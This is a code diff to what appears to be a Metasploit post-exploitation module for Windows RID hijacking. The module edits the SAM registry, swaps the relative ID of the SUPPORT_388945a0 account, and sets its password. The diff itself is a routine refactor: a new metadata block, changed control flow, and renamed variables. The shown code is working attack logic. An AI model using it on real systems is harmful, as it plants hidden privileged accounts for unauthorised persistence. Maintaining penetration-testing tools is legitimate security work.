@@ -31,6 +31,11 @@ class MetasploitModule < Msf::Post
               priv_elevate_getsystem
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
         }
       )
     )
@@ -78,14 +83,16 @@ class MetasploitModule < Msf::Post
     rid = -1
     print_status('Harvesting users...')
     names_key.each do |name|
-      next unless name.include? 'SUPPORT_388945a0'
+      next unless name.include?('SUPPORT_388945a0')
 
       print_good("Found #{name} account!")
       skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", '')
+
       if !skey
         print_error("Couldn't open user's key")
-        return
+        break
       end
+
       rid = skey['Type']
       print_status("Target RID is #{rid}")
     end
@@ -114,7 +121,7 @@ class MetasploitModule < Msf::Post
       open_key = registry_setvaldata(reg_key + "\\#{r}", 'F', f, 'REG_BINARY')
       unless open_key
         print_error("Can't write to registry... Something's wrong!")
-        return
+        break
       end
 
       print_status("Setting password to #{datastore['PASSWORD']}")
@@ -123,19 +130,19 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def check_active(f)
-    if f[0x38].unpack('H*')[0].to_i == 11
+  def check_active(f_value)
+    if f_value[0x38].unpack('H*')[0].to_i == 11
       return true
     else
       return false
     end
   end
 
-  def swap_rid(f, rid)
+  def swap_rid(f_value, rid)
     # This function will set hex format to a given RID integer
     hex = [('%04x' % rid).scan(/.{2}/).reverse.join].pack('H*')
     # Overwrite new RID at offset 0x30
-    f[0x30, 2] = hex
-    return f
+    f_value[0x30, 2] = hex
+    return f_value
   end
 end
